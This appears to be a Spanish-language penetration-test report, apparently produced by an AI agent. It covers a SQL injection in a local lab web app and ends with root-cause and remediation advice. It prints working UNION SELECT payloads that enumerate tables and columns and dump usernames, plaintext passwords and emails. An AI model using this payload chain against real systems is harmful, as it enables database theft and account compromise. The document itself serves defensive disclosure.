# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30  
**Hora:** 15:21:05  
**Analista:** GitHub Copilot CLI  

---

## Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del endpoint principal de la aplicación web. La vulnerabilidad permite a un atacante extraer toda la información de la base de datos, incluyendo credenciales de usuarios.

---

## Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (UNION-based / Error-based) |
| **Severidad** | Crítica (CVSS 9.8) |
| **Parámetro vulnerable** | `id` (GET) |
| **URL afectada** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **Archivo fuente** | `/var/www/html/low.php` (línea 11) |
| **Base de datos** | MariaDB 10.11.14 |

---

## Prueba de Concepto

### 1. Detección - Error SQL con comilla simple

**Request:**
```
GET /?id=1'&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

**Respuesta:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

La aplicación expone errores de SQL directamente, confirmando la vulnerabilidad.

### 2. Explotación - UNION SELECT (2 columnas)

**Payload utilizado:**
```
0' UNION SELECT 1,2-- -
```

**Respuesta:**
```
ID: 0' UNION SELECT 1,2-- -
First name: 1
Surname: 2
```

Se confirman 2 columnas visibles en la respuesta.

### 3. Extracción de información del servidor

**Payload:**
```
0' UNION SELECT database(),user()-- -
```

**Resultado:**
- Base de datos activa: `sqli_demo`
- Usuario DB: `root@172.18.0.3`
- Versión: `10.11.14-MariaDB-ubu2204`
- Directorio de datos: `/var/lib/mysql/`

### 4. Enumeración de tablas

**Payload:**
```
0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Tablas encontradas:**
- `users`

### 5. Enumeración de columnas

**Payload:**
```
0' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
```

**Columnas encontradas:**
```
user_id, first_name, last_name, username, password, email
```

### 6. Extracción de credenciales

**Payload:**
```
0' UNION SELECT group_concat(username,':',password SEPARATOR '|'),group_concat(email) FROM users-- -
```

**Credenciales extraídas:**

| Usuario | Contraseña | Email |
|---------|------------|-------|
| admin | password123 | admin@example.com |
| jsmith | secret456 | jane@example.com |
| bjohnson | mypass789 | bob@example.com |
| awilliams | qwerty123 | alice@example.com |
| cbrown | password | charlie@example.com |
| ddavis | secure123 | diana@example.com |
| emiller | hackme | eve@example.com |
| fwilson | admin123 | frank@example.com |

---

## Causa Raíz

La aplicación construye la consulta SQL concatenando directamente el input del usuario sin sanitización:

```php
// Código vulnerable (low.php)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## Impacto

- **Confidencialidad:** Compromiso total de la base de datos (credenciales, datos personales)
- **Integridad:** Posible modificación o eliminación de datos
- **Disponibilidad:** Posible denegación de servicio mediante consultas maliciosas
- El usuario de BD es `root`, lo que amplía el impacto a toda la instancia de MariaDB

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar inputs:** Verificar que `id` sea un entero antes de usarlo.

3. **Deshabilitar mensajes de error en producción:** Configurar `display_errors = Off` en `php.ini`.

4. **Principio de mínimo privilegio:** Usar un usuario de BD con permisos limitados (solo SELECT en tablas necesarias).

5. **WAF:** Implementar un Web Application Firewall para detectar y bloquear payloads SQLi.

---

## Conclusión

La aplicación web presenta una vulnerabilidad crítica de SQL Injection que permite la extracción completa de la base de datos. Se recomienda **corrección inmediata** antes de exponer la aplicación en un entorno productivo.
